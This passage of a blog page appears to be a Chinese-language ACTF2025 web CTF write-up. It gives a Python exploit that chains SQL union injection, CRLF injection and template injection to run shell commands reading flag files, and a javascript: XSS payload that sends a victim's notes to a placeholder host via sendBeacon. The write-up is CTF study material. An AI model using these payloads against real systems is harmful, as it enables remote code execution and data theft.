+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;http://61.147.171.106:55019&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;http://ezmail.org:3000/news?id=-1 &#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;union select &#39;{{ self.__init__.__globals__.__builtins__.__import__(</span><span class="se">\&#34;</span><span class="s2">os</span><span class="se">\&#34;</span><span class="s2">).popen(</span><span class="se">\&#34;</span><span class="s2">mkdir static;cat /f*&gt;&gt;static/1;sleep 10</span><span class="se">\&#34;</span><span class="s2">).read() }}&#39;</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;From: admin@ezmail.org</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;url&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;content&#34;</span><span class="p">:</span> <span class="s2">&#34;sleep_test&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending payload to /report...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/report&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Triggering bot...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/bot&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">end</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Time elapsed: </span><span class="si">{</span><span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2"> seconds&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] If delay &gt;= 5s, RCE likely succeeded!&#34;</span><span class="p">)</span></span></span></code></pre></div></div><p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202504272316400.png' alt="img"></p>
+<h1 class="heading-element" id="eznote"><span>eznote</span>
+  <a href="#eznote" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-javascript"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/report&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="p">{</span> <span class="nx">url</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">visit</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;success&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span></span></span></code></pre></div></div><p><code>/report</code>路由这里未对url进行处理，url会直接传入bot.js的visit</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-javascript"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">visit</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">browser</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">headless</span><span class="o">:</span> <span class="nx">HEADLESS</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">executablePath</span><span class="o">:</span> <span class="s1">&#39;/usr/bin/chromium&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">args</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;--no-sandbox&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">page</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;http://localhost:3000/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">waitForSelector</span><span class="p">(</span><span class="s1">&#39;#title&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;#title&#39;</span><span class="p">,</span> <span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">delay</span><span class="o">:</span> <span class="mi">100</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;#content&#39;</span><span class="p">,</span> <span class="nx">FLAG</span><span class="p">,</span> <span class="p">{</span><span class="nx">delay</span><span class="o">:</span> <span class="mi">100</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="s1">&#39;#submit&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">delay</span><span class="o">:</span> <span class="mi">100</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;visiting %s&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>通过js伪协议打XSS将nots外带，然后获取note/:noteId中的flag</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-js"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="1" style="--fi-max-shown-lines:100;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">javascript</span><span class="o">:</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/notes&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">d</span><span class="p">=&gt;</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">(</span><span class="s1">&#39;http://ip:port/&#39;</span><span class="p">,</span><span class="nx">d</span><span class="p">))</span></span></span></code></pre></div></div><p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202504272317690.png' alt="img"></p>
+<p>属于非预期</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="Updated on 2025-04-28 09:31:57">Updated on 2025-04-28&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://p0l1st.github.io/post/actf2025-web-writeup/" data-title="ACTF2025 Web Writeup" data-hashtags="CTF,Web安全"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://p0l1st.github.io/post/actf2025-web-writeup/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://p0l1st.github.io/post/actf2025-web-writeup/" data-title="ACTF2025 Web Writeup"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags me-1" aria-hidden="true"></i><a href="/tags/ctf/" class="post-tag" title="Tags - CTF">CTF</a><a href="/tags/web%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Web安全">Web安全</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/post/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-nav-item" rel="prev" title="CTFSHOW-Java反序列化"><i class="fa-solid fa-angle-left" aria-hidden="true"></i>CTFSHOW-Java反序列化</a><a href="/post/%E7%AC%AC%E4%B8%80%E5%B1%8Aopenharmony-ctf%E4%B8%93%E9%A2%98%E8%B5%9B-web-writeup/" class="post-nav-item" rel="next" title="第一届OpenHarmony CTF专题赛 Web Writeup">第一届OpenHarmony CTF专题赛 Web Writeup<i class="fa-solid fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#actf-upload">ACTF upload</a></li>
+    <li><a href="#not-so-web-1">not so web 1</a></li>
+    <li><a href="#not-so-web-2">not so web 2</a></li>
+    <li><a href="#excellent-site">Excellent-Site</a></li>
+    <li><a href="#eznote">eznote</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.161.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.5"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">p0l1st</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/57c1abc0101ef1cb1052e22aed093225.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
